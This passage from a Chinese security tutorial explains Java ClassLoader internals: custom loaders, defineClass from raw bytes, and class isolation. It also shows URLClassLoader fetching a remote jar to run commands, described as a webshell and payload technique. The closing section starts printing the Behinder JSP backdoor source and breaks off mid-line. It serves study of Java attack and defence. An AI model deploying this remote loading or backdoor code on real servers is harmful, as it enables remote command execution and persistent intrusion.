<p>值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个<code>null</code>值，如:<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code>。</p>
<p><code>ClassLoader</code>类有如下核心方法：</p>
<ol>
<li><code>loadClass</code>（加载指定的Java类）</li>
<li><code>findClass</code>（查找指定的Java类）</li>
<li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li>
<li><code>defineClass</code>（定义一个Java类）</li>
<li><code>resolveClass</code>（链接指定的Java类）</li>
</ol>
<h3 id="Java类动态（显式）加载方式"><a href="#Java类动态（显式）加载方式" class="headerlink" title="Java类动态（显式）加载方式"></a>Java类动态（显式）加载方式</h3><p>Java类加载方式分为<code>显式</code>和<code>隐式</code>,<code>显式</code>即我们通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象，而<code>隐式</code>指的是<code>类名.方法名()</code>或<code>new</code>类实例。<code>显式</code>类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。</p>
<p><strong>常用的类动态加载方式：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射加载TestHelloWorld示例</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载TestHelloWorld示例</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code>，而<code>ClassLoader.loadClass</code>默认不会初始化类方法。</p>
<h3 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a>ClassLoader类加载流程</h3><p>以一个Java的HelloWorld来学习<code>ClassLoader</code>。</p>
<p><code>ClassLoader</code>加载<code>com.y5neko.sec.classloader.TestHelloWorld</code>类<code>loadClass</code>重要流程如下：</p>
<ol>
<li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>com.y5neko.sec.classloader.TestHelloWorld</code>类。</li>
<li>调用<code>findLoadedClass</code>方法检查<code>TestHelloWorld</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li>
<li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>TestHelloWorld</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li>
<li>如果上一步无法加载<code>TestHelloWorld</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>TestHelloWorld</code>类。</li>
<li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>com.y5neko.sec.classloader.TestHelloWorld</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li>
<li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li>
<li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li>
</ol>
<img src="/image/20230612144647-1688289465704-6.png" alt="20230612144647" style="zoom: 43%;" />

<img src="/image/image-20230702175759774.png" alt="image-20230702175759774" style="zoom:80%;" />

<img src="/image/image-20230702175910966.png" alt="image-20230702175910966" style="zoom: 80%;" />

<h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p>
<p>既然已知ClassLoader具备了加载类的能力，那么我们不妨尝试下写一个自己的类加载器来实现加载自定义的字节码（这里以加载<code>TestHelloWorld</code>类为例）并调用<code>hello</code>方法。</p>
<p>如果<code>com.y5neko.sec.TestHelloWorld</code>类存在的情况下，我们可以使用如下代码即可实现调用<code>hello</code>方法并输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TestHelloWorld</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestHelloWorld</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> t.hello();</span><br><span class="line">System.out.println(str);</span><br></pre></td></tr></table></figure>

<p>但是如果<code>com.y5neko.sec.classloader.TestHelloWorld</code>根本就不存在于我们的<code>classpath</code>，那么我们可以使用自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法的时候传入<code>TestHelloWorld</code>类的字节码的方式来向JVM中定义一个<code>TestHelloWorld</code>类，最后通过反射机制就可以调用<code>TestHelloWorld</code>类的<code>hello</code>方法了。</p>
<p><strong>测试自定义ClassLoader：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//TestHelloWorld类的字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//其他类通过super关键字调用父类的findClass方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建自定义类加载器</span></span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//使用自定义的类加载器”loader“中的loadClass加载TestHelloWorld类到testClass变量</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">testClass</span> <span class="operator">=</span> loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射创建TestHelloWorld类，等价于”TestHelloWorld t = new TestHelloWorld();“</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">testInstance</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射获取hello方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射调用hello方法，等价于”String str = t.hello();“</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p>
<p><strong>URLClassLoader调用远程方法实例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//定义远程jar包路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://www.ysneko.com/CMD.jar&quot;</span>);</span><br><span class="line">            System.out.println(url);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123;url&#125;);</span><br><span class="line">            System.out.println(ucl);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            Class&lt;?&gt; cmdClass = ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用CMD类中的exec方法，等同于“Process process = CMD.exec(cmd);”</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>,cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(baos);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>远程jar包中的CMD类：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230703145512054.png" alt="image-20230703145512054" style="zoom:80%;" />

<h3 id="类加载隔离"><a href="#类加载隔离" class="headerlink" title="类加载隔离"></a>类加载隔离</h3><p>创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。</p>
<img src="/image/202110251829223.png" alt="img" style="zoom: 50%;" />

<h3 id="跨类加载器加载"><a href="#跨类加载器加载" class="headerlink" title="跨类加载器加载"></a>跨类加载器加载</h3><p>RASP和IAST经常会用到跨类加载器加载类的情况，因为RASP&#x2F;IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP&#x2F;IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException，除此之外，跨类加载器调用类方法时需要特别注意一个基本原则：</p>
<p><strong>ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射。</strong></p>
<p><strong>跨类加载器实例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCrossClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderA</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClassLoaderA</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderB</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClassLoaderB</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载类字节码</span></span><br><span class="line">            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 父类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parentClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// A类加载器</span></span><br><span class="line">        <span class="type">ClassLoaderA</span> <span class="variable">aClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoaderA</span>(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// B类加载器</span></span><br><span class="line">        <span class="type">ClassLoaderB</span> <span class="variable">bClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoaderB</span>(parentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用A/B类加载器加载同一个类</span></span><br><span class="line">        Class&lt;?&gt; aClass  = Class.forName(TEST_CLASS_NAME, <span class="literal">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; aaClass = Class.forName(TEST_CLASS_NAME, <span class="literal">true</span>, aClassLoader);</span><br><span class="line">        Class&lt;?&gt; bClass  = Class.forName(TEST_CLASS_NAME, <span class="literal">true</span>, bClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较A类加载器和B类加载器加载的类是否相等</span></span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == aaClass：&quot;</span> + (aClass == aaClass));</span><br><span class="line">        System.out.println(<span class="string">&quot;aClass == bClass：&quot;</span> + (aClass == bClass));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n&quot;</span> + aClass.getName() + <span class="string">&quot;方法清单：&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该类所有方法</span></span><br><span class="line">        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instanceA</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取hello方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">helloMethod</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用hello方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) helloMethod.invoke(instanceA);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反射调用：&quot;</span> + TEST_CLASS_NAME + <span class="string">&quot;类&quot;</span> + helloMethod.getName() + <span class="string">&quot;方法，返回结果：&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行输出结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A类加载器和B类加载器加载的类不同</span></span><br><span class="line">aClass == aaClass：<span class="literal">true</span></span><br><span class="line">aClass == bClass：<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">com.y5neko.sec.classloader.TestHelloWorld方法清单：</span><br><span class="line"><span class="keyword">public</span> java.lang.String com.y5neko.sec.classloader.TestHelloWorld.hello()</span><br><span class="line"></span><br><span class="line">反射调用：com.y5neko.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~</span><br></pre></td></tr></table></figure>

<h3 id="JSP自定义类加载后门"><a href="#JSP自定义类加载后门" class="headerlink" title="JSP自定义类加载后门"></a>JSP自定义类加载后门</h3><p>以<code>冰蝎</code>为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的<code>equals</code>方法实现恶意攻击，其中<code>equals</code>方法传入的<code>pageContext</code>对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。</p>
<p><strong>冰蝎JSP后门：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> <span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span></span><br><span class="line">        session.putValue(<span class="string">&quot;u&quot;</span>, k);</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span 